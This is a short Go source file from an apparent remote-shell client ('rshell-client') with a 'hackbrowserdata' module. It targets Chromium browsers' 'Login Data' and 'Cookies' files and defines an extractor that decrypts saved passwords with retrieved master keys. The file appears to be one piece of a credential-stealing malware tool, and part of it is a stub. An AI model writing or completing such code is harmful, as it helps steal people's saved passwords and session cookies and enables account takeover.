package chromium

import (
	"path/filepath"

	"rshell-client/shared/hackbrowserdata/crypto/keyretriever"
	"rshell-client/shared/hackbrowserdata/types"
)

type sourcePath struct {
	rel   string
	isDir bool
}

func file(rel string) sourcePath { return sourcePath{rel: filepath.FromSlash(rel), isDir: false} }
func dir(rel string) sourcePath  { return sourcePath{rel: filepath.FromSlash(rel), isDir: true} }

var chromiumSources = map[types.Category][]sourcePath{
	types.Password: {file("Login Data")},
	types.Cookie:   {file("Network/Cookies"), file("Cookies")},
}

func sourcesForKind(kind types.BrowserKind) map[types.Category][]sourcePath {
	return chromiumSources
}

type categoryExtractor interface {
	extract(keys keyretriever.MasterKeys, path string, data *types.BrowserData) error
}

type passwordExtractor struct {
	fn func(keys keyretriever.MasterKeys, path string) ([]types.LoginEntry, error)
}

func (e passwordExtractor) extract(keys keyretriever.MasterKeys, path string, data *types.BrowserData) error {
	var err error
	data.Passwords, err = e.fn(keys, path)
	return err
}

func extractorsForKind(kind types.BrowserKind) map[types.Category]categoryExtractor {
	return nil
}
